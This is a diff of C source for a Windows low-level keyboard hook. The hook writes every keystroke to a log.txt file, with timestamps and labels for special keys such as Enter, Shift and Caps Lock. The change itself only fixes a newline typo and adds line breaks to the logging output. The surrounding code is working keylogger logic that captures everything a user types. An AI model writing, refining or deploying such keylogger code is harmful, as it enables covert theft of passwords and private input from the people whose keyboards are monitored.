@@ -29,24 +29,24 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
            lpSystemTime->wMilliseconds);
                     
            if (result == 1 && pwszBuff[0] >= 32){
-                fprintf(g_log, "Key pressed: %c/n", pwszBuff[0]);     // ykteb code tae character f log.txt
+                fprintf(g_log, "Key pressed: %c\n", pwszBuff[0]);     // ykteb code tae character f log.txt
                  
            }
            else{
                 // ToUnicode failed = not a printable character → check WHICH special key
                             switch (keyCode) {
                                 case VK_RETURN:   fprintf(g_log, "[ENTER]\n");  break;
-                                case VK_SPACE:    fprintf(g_log, "[SPACE]");    break;
+                                case VK_SPACE:    fprintf(g_log, "[SPACE]\n");    break;
                                 case VK_BACK:     fprintf(g_log, "[BACKSPACE]\n");break;
                                 case VK_TAB:      fprintf(g_log, "[TAB]\n");      break;
                                 case VK_ESCAPE:   fprintf(g_log, "[ESC]\n");      break;
                                 case VK_SHIFT:
                                 case VK_LSHIFT:
-                                case VK_RSHIFT:   fprintf(g_log, "[SHIFT]");    break;
+                                case VK_RSHIFT:   fprintf(g_log, "[SHIFT]\n");    break;
                                 case VK_CONTROL:
                                 case VK_LCONTROL:
                                 case VK_RCONTROL: fprintf(g_log, "[CTRL]\n");     break;
-                                case VK_CAPITAL:  fprintf(g_log, "[CAPSLOCK]"); break;
+                                case VK_CAPITAL:  fprintf(g_log, "[CAPSLOCK]\n"); break;
                                 case VK_LEFT:     fprintf(g_log, "[LEFT]\n");     break;
                                 case VK_RIGHT:    fprintf(g_log, "[RIGHT]\n");    break;
                                 case VK_UP:       fprintf(g_log, "[UP]\n");       break;
